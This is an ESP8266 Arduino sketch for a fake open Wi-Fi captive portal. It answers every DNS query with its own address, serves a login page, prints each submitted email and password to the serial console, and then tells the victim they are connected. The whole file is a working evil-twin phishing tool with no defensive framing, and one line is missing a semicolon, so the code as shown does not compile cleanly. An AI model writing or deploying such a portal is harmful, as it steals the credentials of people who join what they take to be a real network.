#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "page.h"

const char* ssid = "ESP8266_SSID";

ESP8266WebServer server(80);
DNSServer dnsServer;

void handleRoot() {
  server.send(200, "text/html", HTML_PAGE);
}

void handleSubmit() {
  String email = server.arg("email");
  String password = server.arg("password");
  Serial.println("Received suspect.")
  Serial.print("Email: ");
  Serial.println(email);
  Serial.print("Password: ");
  Serial.println(password);
  server.send(200, "text/html", "<html><body><h1>You have been connected</h1><p>Thanks for using our services!.</p></body></html>");
}

void redirectToRoot() {
  server.sendHeader("Location", "/", true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  WiFi.softAP(ssid);
  IPAddress ip = WiFi.softAPIP();
  Serial.print("IP Address: ");
  Serial.println(ip);
  dnsServer.start(53, "*", ip);
  server.on("/", handleRoot);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.onNotFound(redirectToRoot);
  server.begin();
  Serial.println("Captive portal activated");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
